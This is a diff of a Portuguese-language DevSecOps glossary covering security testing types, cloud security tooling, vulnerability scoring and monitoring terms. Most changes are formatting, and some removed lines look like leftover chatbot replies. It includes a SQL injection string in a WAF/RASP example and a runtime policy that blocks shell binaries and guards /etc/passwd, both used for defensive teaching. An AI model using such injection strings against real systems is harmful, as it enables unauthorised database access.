@@ -1,49 +1,32 @@
 ---
 aliases:
 ---
+
 # Resumo Rapido
+
 ### 1. Tipos de Testes e Análises (AST)
 
 _Essas siglas definem **como** e **quando** a segurança é verificada no software._
 
 - **AST (Application Security Testing):** Termo "guarda-chuva" para qualquer ferramenta que testa segurança de software.
-    
 - **SAST (Static Application Security Testing):**
-    
-    - _O que é:_ Análise Estática. É o "Teste de Caixa Branca".
-        
-    - _Detalhe:_ Analisa o código-fonte, byte code ou binários **sem executar** a aplicação. Procura erros de sintaxe insegura.
-        
-    - _Ferramenta ex:_ **SonarQube**.
-        
+  - _O que é:_ Análise Estática. É o "Teste de Caixa Branca".
+  - _Detalhe:_ Analisa o código-fonte, byte code ou binários **sem executar** a aplicação. Procura erros de sintaxe insegura.
+  - _Ferramenta ex:_ **SonarQube**.
 - **DAST (Dynamic Application Security Testing):**
-    
-    - _O que é:_ Análise Dinâmica. É o "Teste de Caixa Preta".
-        
-    - _Detalhe:_ Interage com a aplicação **em execução** (rodando). Simula um hacker tentando invadir de fora (inputs maliciosos, SQL Injection).
-        
-    - _Ferramenta ex:_ OWASP ZAP, Burp Suite.
-        
+  - _O que é:_ Análise Dinâmica. É o "Teste de Caixa Preta".
+  - _Detalhe:_ Interage com a aplicação **em execução** (rodando). Simula um hacker tentando invadir de fora (inputs maliciosos, SQL Injection).
+  - _Ferramenta ex:_ OWASP ZAP, Burp Suite.
 - **SCA (Software Composition Analysis):**
-    
-    - _O que é:_ Análise de Composição de Software.
-        
-    - _Detalhe:_ Não olha o seu código, mas sim as **bibliotecas e dependências** (Open Source) que você usou. Se você importou uma biblioteca Java antiga com falha, o SCA avisa.
-        
-    - _Contexto:_ Essencial para segurança da cadeia de suprimentos (Supply Chain).
-        
+  - _O que é:_ Análise de Composição de Software.
+  - _Detalhe:_ Não olha o seu código, mas sim as **bibliotecas e dependências** (Open Source) que você usou. Se você importou uma biblioteca Java antiga com falha, o SCA avisa.
+  - _Contexto:_ Essencial para segurança da cadeia de suprimentos (Supply Chain).
 - **IAST (Interactive Application Security Testing):**
-    
-    - _O que é:_ Teste Interativo.
-        
-    - _Detalhe:_ Um híbrido de SAST e DAST. Um agente é instalado dentro da aplicação e analisa a execução do código em tempo real enquanto testes funcionais rodam.
-        
+  - _O que é:_ Teste Interativo.
+  - _Detalhe:_ Um híbrido de SAST e DAST. Um agente é instalado dentro da aplicação e analisa a execução do código em tempo real enquanto testes funcionais rodam.
 - **RASP (Runtime Application Self-Protection):**
-    
-    - _O que é:_ Autoproteção em Tempo de Execução.
-        
-    - _Detalhe:_ Não é apenas um teste, é uma defesa. O software consegue detectar que está sendo atacado e bloquear a ação sozinho.
-        
+  - _O que é:_ Autoproteção em Tempo de Execução.
+  - _Detalhe:_ Não é apenas um teste, é uma defesa. O software consegue detectar que está sendo atacado e bloquear a ação sozinho.
 
 ---
 
@@ -52,35 +35,20 @@ _Essas siglas definem **como** e **quando** a segurança é verificada no softwa
 _Onde o código "mora". Aqui entram as siglas modernas de Cloud Security._
 
 - **IaC (Infrastructure as Code):**
-    
-    - _O que é:_ Infraestrutura como Código.
-        
-    - _Detalhe:_ Gerenciar servidores usando arquivos de configuração (ex: Terraform, Ansible) em vez de painéis manuais. Permite versionar a infraestrutura.
-        
+  - _O que é:_ Infraestrutura como Código.
+  - _Detalhe:_ Gerenciar servidores usando arquivos de configuração (ex: Terraform, Ansible) em vez de painéis manuais. Permite versionar a infraestrutura.
 - **CSPM (Cloud Security Posture Management):**
-    
-    - _O que é:_ Gerenciamento de Postura de Segurança na Nuvem.
-        
-    - _Detalhe:_ Ferramenta que monitora AWS/Azure/GCP para ver se você configurou algo errado (ex: deixou um bucket S3 público sem querer).
-        
+  - _O que é:_ Gerenciamento de Postura de Segurança na Nuvem.
+  - _Detalhe:_ Ferramenta que monitora AWS/Azure/GCP para ver se você configurou algo errado (ex: deixou um bucket S3 público sem querer).
 - **CWPP (Cloud Workload Protection Platform):**
-    
-    - _O que é:_ Plataforma de Proteção de Workloads na Nuvem.
-        
-    - _Detalhe:_ Foca na segurança do que _roda_ na nuvem (o container, a máquina virtual, a função serverless), protegendo contra malwares e intrusões.
-        
+  - _O que é:_ Plataforma de Proteção de Workloads na Nuvem.
+  - _Detalhe:_ Foca na segurança do que _roda_ na nuvem (o container, a máquina virtual, a função serverless), protegendo contra malwares e intrusões.
 - **CNAPP (Cloud-Native Application Protection Platform):**
-    
-    - _O que é:_ Plataforma de Proteção de Aplicações Cloud-Native.
-        
-    - _Detalhe:_ É a tendência atual. Combina **CSPM + CWPP + CIEM** em uma única ferramenta. É a "solução completa" para nuvem.
-        
+  - _O que é:_ Plataforma de Proteção de Aplicações Cloud-Native.
+  - _Detalhe:_ É a tendência atual. Combina **CSPM + CWPP + CIEM** em uma única ferramenta. É a "solução completa" para nuvem.
 - **K8s (Kubernetes):**
-    
-    - _O que é:_ Abreviação de Kubernetes (8 letras entre o K e o s).
-        
-    - _Detalhe:_ Sistema de orquestração de containers. Em DevSecOps, proteger o K8s é uma das tarefas mais críticas e difíceis.
-        
+  - _O que é:_ Abreviação de Kubernetes (8 letras entre o K e o s).
+  - _Detalhe:_ Sistema de orquestração de containers. Em DevSecOps, proteger o K8s é uma das tarefas mais críticas e difíceis.
 
 ---
 
@@ -89,41 +57,23 @@ _Onde o código "mora". Aqui entram as siglas modernas de Cloud Security._
 _Como classificamos e medimos os problemas encontrados._
 
 - **CVE (Common Vulnerabilities and Exposures):**
-    
-    - _O que é:_ É o "RG" de uma vulnerabilidade.
-        
-    - _Detalhe:_ Uma lista pública mundial. Exemplo: `CVE-2021-44228` (Log4Shell). Se o scanner (Tenable) achou algo, ele te dará o código CVE.
-        
+  - _O que é:_ É o "RG" de uma vulnerabilidade.
+  - _Detalhe:_ Uma lista pública mundial. Exemplo: `CVE-2021-44228` (Log4Shell). Se o scanner (Tenable) achou algo, ele te dará o código CVE.
 - **CVSS (Common Vulnerability Scoring System):**
-    
-    - _O que é:_ A "Nota" da vulnerabilidade.
-        
-    - _Detalhe:_ Vai de 0.0 a 10.0. Ajuda a priorizar.
-        
-        - 0-3.9: Baixa
-            
-        - 4.0-6.9: Média
-            
-        - 7.0-8.9: Alta
-            
-        - 9.0-10.0: Crítica
-            
+  - _O que é:_ A "Nota" da vulnerabilidade.
+  - _Detalhe:_ Vai de 0.0 a 10.0. Ajuda a priorizar.
+    - 0-3.9: Baixa
+    - 4.0-6.9: Média
+    - 7.0-8.9: Alta
+    - 9.0-10.0: Crítica
 - **CWE (Common Weakness Enumeration):**
-    
-    - _O que é:_ A categoria do erro.
-        
-    - _Detalhe:_ Enquanto CVE é a falha específica, CWE é o "tipo" (ex: CWE-79 é Cross-Site Scripting).
-        
+  - _O que é:_ A categoria do erro.
+  - _Detalhe:_ Enquanto CVE é a falha específica, CWE é o "tipo" (ex: CWE-79 é Cross-Site Scripting).
 - **NVD (National Vulnerability Database):**
-    
-    - _O que é:_ O banco de dados do governo dos EUA que lista todos os CVEs.
-        
+  - _O que é:_ O banco de dados do governo dos EUA que lista todos os CVEs.
 - **Zero-Day (0-day):**
-    
-    - _O que é:_ Vulnerabilidade de "Dia Zero".
-        
-    - _Detalhe:_ Uma falha que os hackers descobriram, mas o fabricante do software ainda não conhece ou não criou a correção. Não há "vacina" (patch) ainda.
-        
+  - _O que é:_ Vulnerabilidade de "Dia Zero".
+  - _Detalhe:_ Uma falha que os hackers descobriram, mas o fabricante do software ainda não conhece ou não criou a correção. Não há "vacina" (patch) ainda.
 
 ---
 
@@ -132,27 +82,16 @@ _Como classificamos e medimos os problemas encontrados._
 _O dia a dia de monitoramento e reação (onde entra OpenCTI e Tenable)._
 
 - **SIEM (Security Information and Event Management):**
-    
-    - _O que é:_ Gerenciamento e Correlação de Eventos.
-        
-    - _Detalhe:_ Centraliza logs de toda a empresa (firewall, servidores, antivírus) para detectar padrões de ataque. Ferramentas: Splunk, Elastic, Sentinel.
-        
+  - _O que é:_ Gerenciamento e Correlação de Eventos.
+  - _Detalhe:_ Centraliza logs de toda a empresa (firewall, servidores, antivírus) para detectar padrões de ataque. Ferramentas: Splunk, Elastic, Sentinel.
 - **SOAR (Security Orchestration, Automation, and Response):**
-    
-    - _O que é:_ Orquestração e Resposta Automatizada.
-        
-    - _Detalhe:_ Se o SIEM detecta um ataque, o SOAR pode executar um script automático para bloquear o IP do atacante no firewall sem intervenção humana.
-        
+  - _O que é:_ Orquestração e Resposta Automatizada.
+  - _Detalhe:_ Se o SIEM detecta um ataque, o SOAR pode executar um script automático para bloquear o IP do atacante no firewall sem intervenção humana.
 - **SOC (Security Operations Center):**
-    
-    - _O que é:_ O time/local físico onde os analistas de segurança monitoram as telas 24/7.
-        
+  - _O que é:_ O time/local físico onde os analistas de segurança monitoram as telas 24/7.
 - **CTI (Cyber Threat Intelligence):**
-    
-    - _O que é:_ Inteligência de Ameaças.
-        
-    - _Detalhe:_ Coleta de dados para entender táticas, técnicas e procedimentos (TTPs) dos hackers. (Área do **OpenCTI**).
-        
+  - _O que é:_ Inteligência de Ameaças.
+  - _Detalhe:_ Coleta de dados para entender táticas, técnicas e procedimentos (TTPs) dos hackers. (Área do **OpenCTI**).
 
 ---
 
@@ -161,48 +100,25 @@ _O dia a dia de monitoramento e reação (onde entra OpenCTI e Tenable)._
 _Termos administrativos e de fluxo de trabalho._
 
 - **CI/CD (Continuous Integration / Continuous Delivery):**
-    
-    - _O que é:_ A esteira automática de software.
-        
-    - _Detalhe:_ O "tubo" por onde o código passa. O objetivo do DevSecOps é colocar ferramentas de segurança (SAST/DAST) _dentro_ do CI/CD.
-        
+  - _O que é:_ A esteira automática de software.
+  - _Detalhe:_ O "tubo" por onde o código passa. O objetivo do DevSecOps é colocar ferramentas de segurança (SAST/DAST) _dentro_ do CI/CD.
 - **SBOM (Software Bill of Materials):**
-    
-    - _O que é:_ Lista de Materiais de Software.
-        
-    - _Detalhe:_ Um "inventário" completo de todos os componentes que compõem seu software. Muito exigido hoje em dia para auditoria.
-        
+  - _O que é:_ Lista de Materiais de Software.
+  - _Detalhe:_ Um "inventário" completo de todos os componentes que compõem seu software. Muito exigido hoje em dia para auditoria.
 - **OWASP (Open Web Application Security Project):**
-    
-    - _O que é:_ Fundação mundial sem fins lucrativos que define padrões de segurança web.
-        
-    - _Destaque:_ **OWASP Top 10** (a lista das 10 falhas mais críticas da web). Todo DevSecOps tem que saber isso de cor.
-        
+  - _O que é:_ Fundação mundial sem fins lucrativos que define padrões de segurança web.
+  - _Destaque:_ **OWASP Top 10** (a lista das 10 falhas mais críticas da web). Todo DevSecOps tem que saber isso de cor.
 - **MTTR (Mean Time to Remediate/Response):**
-    
-    - _O que é:_ Tempo Médio para Remediação.
-        
-    - _Detalhe:_ KPI (indicador) importante. Quanto tempo seu time demora entre descobrir uma falha crítica e aplicar a correção?
-        
+  - _O que é:_ Tempo Médio para Remediação.
+  - _Detalhe:_ KPI (indicador) importante. Quanto tempo seu time demora entre descobrir uma falha crítica e aplicar a correção?
 
 ---
-
-### Dica para Anotação:
-
-Se você tiver que priorizar para aprender **hoje**, foque neste trio:
 
 1. **CI/CD** (Onde tudo acontece).
-    
 2. **SAST/DAST** (As principais ferramentas).
-    
 3. **CVE/CVSS** (Como medir o risco).
-    
-
-Quer que eu explique com mais detalhes alguma dessas categorias específicas, como por exemplo, o **OWASP Top 10**?
 
 ---
-Vou criar uma documentação completa e avançada sobre as siglas de DevSecOps no mesmo nível de profundidade dos documentos anteriores.
-
 
 # DevSecOps - Glossário Técnico de Siglas e Conceitos
 
@@ -237,23 +153,23 @@ graph TD
     AST --> IAST[Interactive Analysis]
     AST --> SCA[Composition Analysis]
     AST --> RASP[Runtime Protection]
-    
+
     SAST --> S1[Code Review]
     DAST --> D1[Black-box Testing]
     IAST --> I1[Gray-box Testing]
     SCA --> SC1[Dependency Scanning]
     RASP --> R1[Self-Protection]
-````
+```
 
 **Quando usar cada tipo:**
 
-|Fase do SDLC|Tipo AST Recomendado|Motivo|
-|---|---|---|
-|**Coding**|SAST + SCA|Detecta bugs antes do commit|
-|**Build**|SAST + SCA + Secrets Scanning|Valida código compilado|
-|**Test**|DAST + IAST|Testa aplicação rodando|
-|**Deploy**|RASP|Proteção em produção|
-|**Runtime**|RASP + WAF|Defesa ativa|
+| Fase do SDLC | Tipo AST Recomendado          | Motivo                       |
+| ------------ | ----------------------------- | ---------------------------- |
+| **Coding**   | SAST + SCA                    | Detecta bugs antes do commit |
+| **Build**    | SAST + SCA + Secrets Scanning | Valida código compilado      |
+| **Test**     | DAST + IAST                   | Testa aplicação rodando      |
+| **Deploy**   | RASP                          | Proteção em produção         |
+| **Runtime**  | RASP + WAF                    | Defesa ativa                 |
 
 ---
 
@@ -298,15 +214,15 @@ Exemplo de detecção:
 
 **Ferramentas SAST por Linguagem:**
 
-|Linguagem|Ferramenta Open-Source|Ferramenta Comercial|
-|---|---|---|
-|**Java**|SonarQube, SpotBugs, PMD|Checkmarx, Veracode, Fortify|
-|**JavaScript/TS**|ESLint + security plugins, SonarQube|Snyk Code, Checkmarx|
-|**Python**|Bandit, SonarQube|Checkmarx, Veracode|
-|**C/C++**|Cppcheck, Flawfinder|Coverity, Klocwork|
-|**.NET/C#**|SonarQube, Security Code Scan|Fortify, Veracode|
-|**Go**|gosec, SonarQube|Snyk Code|
-|**PHP**|RIPS, SonarQube|Checkmarx|
+| Linguagem         | Ferramenta Open-Source               | Ferramenta Comercial         |
+| ----------------- | ------------------------------------ | ---------------------------- |
+| **Java**          | SonarQube, SpotBugs, PMD             | Checkmarx, Veracode, Fortify |
+| **JavaScript/TS** | ESLint + security plugins, SonarQube | Snyk Code, Checkmarx         |
+| **Python**        | Bandit, SonarQube                    | Checkmarx, Veracode          |
+| **C/C++**         | Cppcheck, Flawfinder                 | Coverity, Klocwork           |
+| **.NET/C#**       | SonarQube, Security Code Scan        | Fortify, Veracode            |
+| **Go**            | gosec, SonarQube                     | Snyk Code                    |
+| **PHP**           | RIPS, SonarQube                      | Checkmarx                    |
 
 **Exemplo prático (Java):**
 
@@ -391,15 +307,15 @@ Exemplo de ataque:
 
 **Ferramentas DAST:**
 
-|Ferramenta|Tipo|Especialidade|
-|---|---|---|
-|**OWASP ZAP**|Open-Source|Web apps, APIs REST|
-|**Burp Suite**|Freemium|Pentest manual + automatizado|
-|**Nikto**|Open-Source|Webserver scanning|
-|**Acunetix**|Comercial|Web apps, cobertura ampla|
-|**Netsparker**|Comercial|Baixo falso positivo|
-|**Qualys WAS**|Comercial|Compliance (PCI-DSS)|
-|**Tenable.io WAS**|Comercial|Integração com VM|
+| Ferramenta         | Tipo        | Especialidade                 |
+| ------------------ | ----------- | ----------------------------- |
+| **OWASP ZAP**      | Open-Source | Web apps, APIs REST           |
+| **Burp Suite**     | Freemium    | Pentest manual + automatizado |
+| **Nikto**          | Open-Source | Webserver scanning            |
+| **Acunetix**       | Comercial   | Web apps, cobertura ampla     |
+| **Netsparker**     | Comercial   | Baixo falso positivo          |
+| **Qualys WAS**     | Comercial   | Compliance (PCI-DSS)          |
+| **Tenable.io WAS** | Comercial   | Integração com VM             |
 
 **Exemplo prático (OWASP ZAP):**
 
@@ -429,7 +345,7 @@ name: DAST Scan
 
 on:
   schedule:
-    - cron: '0 2 * * *'  # Daily at 2 AM
+    - cron: "0 2 * * *" # Daily at 2 AM
   workflow_dispatch:
 
 jobs:
@@ -439,16 +355,16 @@ jobs:
       - name: ZAP Baseline Scan
         uses: zaproxy/action-baseline@v0.7.0
         with:
-          target: 'https://staging.company.com'
-          rules_file_name: '.zap/rules.tsv'
-          cmd_options: '-a -j'  # AJAX spider, JSON report
-      
+          target: "https://staging.company.com"
+          rules_file_name: ".zap/rules.tsv"
+          cmd_options: "-a -j" # AJAX spider, JSON report
+
       - name: Upload Results
         uses: actions/upload-artifact@v3
         with:
           name: zap-report
           path: report_html.html
-      
+
       - name: Fail on High/Critical
         run: |
           HIGH=$(jq '.site[].alerts[] | select(.riskcode == "3" or .riskcode == "4") | length' report_json.json)
@@ -471,7 +387,7 @@ Estatísticas (2024):
   - 80-90% do código em aplicações modernas é de terceiros
   - 84% das aplicações têm pelo menos 1 vulnerabilidade em dependências
   - Log4Shell (CVE-2021-44228): Afetou 93% das aplicações Java corporativas
-  
+
 Supply Chain Attacks:
   - SolarWinds (2020): Backdoor em biblioteca de update
   - Event-Stream (2018): Malware em package npm
@@ -485,36 +401,36 @@ Processo SCA:
   1. Dependency Resolution: Identifica todas as dependências
      - Diretas: package.json, pom.xml, requirements.txt
      - Transitivas: Dependências das dependências
-  
+
   2. Component Identification: Cria "fingerprint" de cada lib
      - Hash do arquivo (SHA-256)
      - Package manager metadata
      - Versão exata
-  
+
   3. Vulnerability Lookup: Consulta databases
      - National Vulnerability Database (NVD)
      - GitHub Advisory Database
      - Sonatype OSS Index
      - Snyk Vulnerability DB
-  
+
   4. License Compliance: Valida licenças
      - GPL (copyleft - requer open-source)
      - MIT (permissiva)
      - Apache 2.0 (permissiva com patentes)
-  
+
   5. Report: Prioriza por exploitabilidade + severity
 ```
 
 **Ferramentas SCA:**
 
-|Ferramenta|Tipo|Databases|Destaque|
-|---|---|---|---|
-|**Snyk**|Freemium|Proprietário + NVD|Fix PRs automáticos|
-|**Dependabot**|Free (GitHub)|GitHub Advisory|Integração nativa GitHub|
-|**OWASP Dependency-Check**|Open-Source|NVD|CLI, multi-linguagem|
-|**WhiteSource (Mend)**|Comercial|Próprio + NVD|License compliance|
-|**Sonatype Nexus IQ**|Comercial|Sonatype OSS Index|Policy enforcement|
-|**JFrog Xray**|Comercial|VulnDB|Integração Artifactory|
+| Ferramenta                 | Tipo          | Databases          | Destaque                 |
+| -------------------------- | ------------- | ------------------ | ------------------------ |
+| **Snyk**                   | Freemium      | Proprietário + NVD | Fix PRs automáticos      |
+| **Dependabot**             | Free (GitHub) | GitHub Advisory    | Integração nativa GitHub |
+| **OWASP Dependency-Check** | Open-Source   | NVD                | CLI, multi-linguagem     |
+| **WhiteSource (Mend)**     | Comercial     | Próprio + NVD      | License compliance       |
+| **Sonatype Nexus IQ**      | Comercial     | Sonatype OSS Index | Policy enforcement       |
+| **JFrog Xray**             | Comercial     | VulnDB             | Integração Artifactory   |
 
 **Exemplo prático (Node.js):**
 
@@ -523,8 +439,8 @@ Processo SCA:
 {
   "dependencies": {
     "express": "4.17.1",
-    "lodash": "4.17.19",  // ⚠️ Vulnerável
-    "axios": "0.21.1"     // ⚠️ Vulnerável
+    "lodash": "4.17.19", // ⚠️ Vulnerável
+    "axios": "0.21.1" // ⚠️ Vulnerável
   }
 }
 ```
@@ -547,7 +463,7 @@ Project path: /app
   Info: https://snyk.io/vuln/SNYK-JS-LODASH-1018905
   From: lodash@4.17.19
   Fixed in: 4.17.21
-  
+
 ✗ Medium severity vulnerability found in axios
   Description: Server-Side Request Forgery (SSRF)
   Info: https://snyk.io/vuln/SNYK-JS-AXIOS-1038255
@@ -570,14 +486,14 @@ updates:
     schedule:
       interval: "daily"
     open-pull-requests-limit: 10
-    
+
     # Auto-merge security patches
     reviewers:
       - "security-team"
     labels:
       - "dependencies"
       - "security"
-    
+
     # Version constraints
     ignore:
       - dependency-name: "react"
@@ -650,15 +566,15 @@ axios    0.21.1     CVE-2021-3749   Medium
 
 **Vantagens vs SAST/DAST:**
 
-|Aspecto|SAST|DAST|IAST|
-|---|---|---|---|
-|**Falsos Positivos**|Alto (30-40%)|Baixo (5-10%)|**Muito Baixo (1-5%)**|
-|**Code Coverage**|100%|20-40%|**60-80%**|
-|**Precisão**|Média|Alta|**Muito Alta**|
-|**Performance**|Rápido|Lento|**Médio**|
-|**Linha de código**|✅ Sim|❌ Não|✅ Sim|
-|**Runtime issues**|❌ Não|✅ Sim|✅ Sim|
-|**Setup**|Fácil|Médio|**Difícil (agent)**|
+| Aspecto              | SAST          | DAST          | IAST                   |
+| -------------------- | ------------- | ------------- | ---------------------- |
+| **Falsos Positivos** | Alto (30-40%) | Baixo (5-10%) | **Muito Baixo (1-5%)** |
+| **Code Coverage**    | 100%          | 20-40%        | **60-80%**             |
+| **Precisão**         | Média         | Alta          | **Muito Alta**         |
+| **Performance**      | Rápido        | Lento         | **Médio**              |
+| **Linha de código**  | ✅ Sim        | ❌ Não        | ✅ Sim                 |
+| **Runtime issues**   | ❌ Não        | ✅ Sim        | ✅ Sim                 |
+| **Setup**            | Fácil         | Médio         | **Difícil (agent)**    |
 
 **Ferramentas IAST:**
 
@@ -705,7 +621,7 @@ WAF (Web Application Firewall):
   Knowledge: Generic attack signatures
   Blocking: Based on HTTP patterns
   Limitation: Não entende contexto da aplicação
-  
+
   Example:
     Request: GET /users?id=1' OR '1'='1
     WAF: Blocks (detected SQL injection pattern)
@@ -716,7 +632,7 @@ RASP (Runtime Protection):
   Knowledge: Application logic + context
   Blocking: Based on actual execution
   Advantage: Zero false positives
-  
+
   Example:
     Request: GET /users?id=1' OR '1'='1
     RASP: Monitors SQL execution
@@ -733,13 +649,13 @@ Monitor Mode (Passive):
   - Loga eventos
   - NÃO bloqueia
   - Usado para tuning (evitar falsos positivos)
-  
+
 Block Mode (Active):
   - Detecta ataques
   - Bloqueia execução
   - Retorna erro HTTP 403
   - Modo de produção
-  
+
 Virtual Patch:
   - Protege vulnerabilidade conhecida
   - Mesmo sem patch disponível
@@ -820,14 +736,14 @@ Documentação:
 
 **Ferramentas IaC:**
 
-|Ferramenta|Tipo|Linguagem|Cloud|Uso|
-|---|---|---|---|---|
-|**Terraform**|Declarativo|HCL|Multi-cloud|Provisioning|
-|**Ansible**|Imperativo|YAML|Agnostic|Config Management|
-|**CloudFormation**|Declarativo|JSON/YAML|AWS only|AWS native|
-|**Pulumi**|Imperativo|TypeScript/Python|Multi-cloud|Developers|
-|**ARM Templates**|Declarativo|JSON|Azure only|Azure native|
-|**CDK**|Imperativo|TypeScript/Python|AWS|Programmatic|
+| Ferramenta         | Tipo        | Linguagem         | Cloud       | Uso               |
+| ------------------ | ----------- | ----------------- | ----------- | ----------------- |
+| **Terraform**      | Declarativo | HCL               | Multi-cloud | Provisioning      |
+| **Ansible**        | Imperativo  | YAML              | Agnostic    | Config Management |
+| **CloudFormation** | Declarativo | JSON/YAML         | AWS only    | AWS native        |
+| **Pulumi**         | Imperativo  | TypeScript/Python | Multi-cloud | Developers        |
+| **ARM Templates**  | Declarativo | JSON              | Azure only  | Azure native      |
+| **CDK**            | Imperativo  | TypeScript/Python | AWS         | Programmatic      |
 
 **Exemplo Terraform (AWS EC2):**
 
@@ -835,7 +751,7 @@ Documentação:
 # main.tf
 terraform {
   required_version = ">= 1.0"
-  
+
   backend "s3" {
     bucket = "company-terraform-state"
     key    = "prod/ec2/terraform.tfstate"
@@ -851,21 +767,21 @@ provider "aws" {
 resource "aws_security_group" "web" {
   name        = "web-server-sg"
   description = "Allow HTTP/HTTPS inbound"
-  
+
   ingress {
     from_port   = 443
     to_port     = 443
     protocol    = "tcp"
     cidr_blocks = ["0.0.0.0/0"]
   }
-  
+
   egress {
     from_port   = 0
     to_port     = 0
     protocol    = "-1"
     cidr_blocks = ["0.0.0.0/0"]
   }
-  
+
   tags = {
     Environment = "production"
     ManagedBy   = "terraform"
@@ -876,18 +792,18 @@ resource "aws_security_group" "web" {
 resource "aws_instance" "web" {
   ami           = data.aws_ami.ubuntu.id
   instance_type = "t3.medium"
-  
+
   vpc_security_group_ids = [aws_security_group.web.id]
-  
+
   root_block_device {
     encrypted   = true  # ✅ Security best practice
     volume_size = 50
   }
-  
+
   metadata_options {
     http_tokens = "required"  # ✅ IMDSv2 obrigatório
   }
-  
+
   tags = {
     Name = "web-server-prod"
   }
@@ -902,14 +818,14 @@ $ checkov -d . --framework terraform
 
 Check: CKV_AWS_8: "Ensure all data stored in the Launch configuration EBS is securely encrypted"
   PASSED for resource: aws_instance.web
-  
+
 Check: CKV_AWS_79: "Ensure Instance Metadata Service Version 1 is not enabled"
   PASSED for resource: aws_instance.web
 
 Check: CKV_AWS_24: "Ensure no security groups allow ingress from 0.0.0.0:0 to port 22"
   FAILED for resource: aws_security_group.ssh
   File: /main.tf:45-52
-  
+
   45 | resource "aws_security_group" "ssh" {
   46 |   ingress {
   47 |     from_port   = 22
@@ -931,7 +847,7 @@ deny[msg] {
   resource := input.resource_changes[_]
   resource.type == "aws_s3_bucket"
   not resource.change.after.server_side_encryption_configuration
-  
+
   msg := sprintf("S3 bucket '%s' must have encryption enabled", [resource.address])
 }
 
@@ -941,7 +857,7 @@ deny[msg] {
   rule := resource.change.after.ingress[_]
   rule.cidr_blocks[_] == "0.0.0.0/0"
   rule.from_port == 22
-  
+
   msg := sprintf("Security group '%s' allows SSH from internet", [resource.address])
 }
 ```
@@ -955,43 +871,39 @@ deny[msg] {
 **Principais verificações:**
 
 ```yaml
-Identity & Access:
-  ✓ IAM users sem MFA
+Identity & Access: ✓ IAM users sem MFA
   ✓ Root account usage
   ✓ Credenciais antigas (> 90 dias)
   ✓ Permissões excessivas (overprivileged)
   ✓ Public access keys no código
 
-Storage:
-  ✓ S3 buckets públicos
+Storage: ✓ S3 buckets públicos
   ✓ Discos sem encryption
   ✓ Backups não configurados
   ✓ Versioning desabilitado
 
-Network:
-  ✓ Security Groups permissivos (0.0.0.0/0)
+Network: ✓ Security Groups permissivos (0.0.0.0/0)
   ✓ VPCs sem Flow Logs
   ✓ Databases expostos à internet
   ✓ SSL/TLS desatualizado
 
-Logging:
-  ✓ CloudTrail desabilitado
+Logging: ✓ CloudTrail desabilitado
   ✓ Logs não retidos
   ✓ Monitoring sem alertas
 ```
 
 **Ferramentas CSPM:**
 
-|Ferramenta|Clouds|Destaque|
-|---|---|---|
-|**Prisma Cloud (Palo Alto)**|AWS, Azure, GCP, Alibaba|CSPM + CWPP combinado|
-|**Wiz**|Multi-cloud|Graph-based risk analysis|
-|**Orca Security**|Multi-cloud|Agentless scanning|
-|**Lacework**|AWS, Azure, GCP|Behavioral anomaly detection|
-|**Aqua CSPM**|Multi-cloud|Container focus|
-|**CloudGuard (Check Point)**|Multi-cloud|Threat prevention|
-|**AWS Security Hub**|AWS only|Native AWS|
-|**Azure Security Center**|Azure only|Native Azure|
+| Ferramenta                   | Clouds                   | Destaque                     |
+| ---------------------------- | ------------------------ | ---------------------------- |
+| **Prisma Cloud (Palo Alto)** | AWS, Azure, GCP, Alibaba | CSPM + CWPP combinado        |
+| **Wiz**                      | Multi-cloud              | Graph-based risk analysis    |
+| **Orca Security**            | Multi-cloud              | Agentless scanning           |
+| **Lacework**                 | AWS, Azure, GCP          | Behavioral anomaly detection |
+| **Aqua CSPM**                | Multi-cloud              | Container focus              |
+| **CloudGuard (Check Point)** | Multi-cloud              | Threat prevention            |
+| **AWS Security Hub**         | AWS only                 | Native AWS                   |
+| **Azure Security Center**    | Azure only               | Native Azure                 |
 
 **Exemplo de finding CSPM:**
 
@@ -1006,17 +918,17 @@ Issue: Publicly Accessible S3 Bucket
 Description: |
   Bucket 'company-backups' allows public read access.
   This exposes 45,000 objects (1.2TB) to the internet.
-  
+
 Evidence:
   ACL: public-read
-  Bucket Policy: 
+  Bucket Policy:
     {
       "Effect": "Allow",
       "Principal": "*",
       "Action": "s3:GetObject",
       "Resource": "arn:aws:s3:::company-backups/*"
     }
-  
+
 Impact:
   - Data Exfiltration Risk: HIGH
   - Contains: Database backups, customer PII
@@ -1028,13 +940,13 @@ Remediation:
        --bucket company-backups \
        --public-access-block-configuration \
        "BlockPublicAcls=true,IgnorePublicAcls=true,BlockPublicPolicy=true,RestrictPublicBuckets=true"
-  
+
   2. Enable encryption:
      aws s3api put-bucket-encryption \
        --bucket company-backups \
        --server-side-encryption-configuration \
        '{"Rules":[{"ApplyServerSideEncryptionByDefault":{"SSEAlgorithm":"AES256"}}]}'
-  
+
   3. Enable versioning (accidental deletion protection)
   4. Configure lifecycle policy (auto-delete old backups)
 
@@ -1048,7 +960,7 @@ CIS Benchmarks:
   - CIS AWS Foundations Benchmark v1.5
   - CIS Azure Foundations Benchmark v2.0
   - CIS GCP Foundations Benchmark v1.3
-  
+
   Example rules:
     ✓ 1.1 - Maintain current contact details
     ✓ 1.12 - Ensure no root user access key exists
@@ -1083,7 +995,7 @@ CSPM (Configuração):
     - S3 bucket é público?
     - Security Group permite SSH?
     - Encryption habilitado?
-  
+
 CWPP (Runtime):
   Focus: "O que está RODANDO está seguro?"
   Examples:
@@ -1096,25 +1008,25 @@ CWPP (Runtime):
 
 ```yaml
 1. Vulnerability Management:
-   - Scan de imagens de container
-   - Patch management para VMs
-   - Kernel vulnerability detection
+  - Scan de imagens de container
+  - Patch management para VMs
+  - Kernel vulnerability detection
 
 2. Runtime Protection:
-   - Anti-malware
-   - File integrity monitoring (FIM)
-   - Process monitoring
-   - Network traffic analysis
+  - Anti-malware
+  - File integrity monitoring (FIM)
+  - Process monitoring
+  - Network traffic analysis
 
 3. Compliance:
-   - CIS Docker Benchmark
-   - Kubernetes security policies
-   - PCI-DSS workload requirements
+  - CIS Docker Benchmark
+  - Kubernetes security policies
+  - PCI-DSS workload requirements
 
 4. Segmentation:
-   - Microsegmentation rules
-   - Network policy enforcement
-   - Service mesh security
+  - Microsegmentation rules
+  - Network policy enforcement
+  - Service mesh security
 ```
 
 **Ferramentas CWPP:**
@@ -1134,8 +1046,8 @@ kind: RuntimePolicy
 metadata:
   name: production-containers
 spec:
-  enforcement_mode: enforce  # block | audit | enforce
-  
+  enforcement_mode: enforce # block | audit | enforce
+
   # File System Protection
   file_block_rules:
     - path: /etc/passwd
@@ -1144,7 +1056,7 @@ spec:
     - path: /bin/*
       action: audit
       reason: "Binary modification detected"
-  
+
   # Process Protection
   blocked_executables:
     - /bin/bash
@@ -1153,21 +1065,21 @@ spec:
